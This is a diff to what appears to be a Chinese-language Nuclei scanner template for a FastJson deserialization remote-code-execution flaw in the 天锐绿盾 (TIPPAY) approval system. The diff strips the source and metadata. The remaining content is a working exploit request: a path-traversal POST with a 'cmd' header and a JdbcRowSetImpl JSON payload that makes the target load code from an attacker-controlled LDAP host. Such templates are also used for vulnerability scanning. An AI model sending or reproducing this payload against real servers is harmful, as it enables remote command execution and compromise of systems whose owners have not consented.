@@ -3,15 +3,11 @@ info:
   name: 天锐绿盾审批系统 template 存在FastJson反序列化RCE漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hcbtyocuff5qvqme'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hcbtyocuff5qvqme
-    fofa: app="TIPPAY-绿盾审批系统"
 http:
 - raw:
-  - "POST /trwfe/service/.%2E/rest/ext/template HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\nAccept-Encoding: gzip, deflate\nAccept: */*\nContent-Type: application/json\nConnection: keep-alive\ncmd: dir\n\n{\n    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n    \"dataSourceName\": \"ldap://vpsip:1389/TomcatBypass/TomcatEcho\",\n    \"autoCommit\": true\n}\n\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1755944132404-2b5f52c1-bb8d-4979-aea9-5ea98b1564ac.png)"
+  - "POST /trwfe/service/.%2E/rest/ext/template HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\nAccept-Encoding: gzip, deflate\nAccept: */*\nContent-Type: application/json\nConnection: keep-alive\ncmd: dir\n\n{\n    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n    \"dataSourceName\": \"ldap://vpsip:1389/TomcatBypass/TomcatEcho\",\n    \"autoCommit\": true\n}"
   redirects: false
   matchers:
   - status:
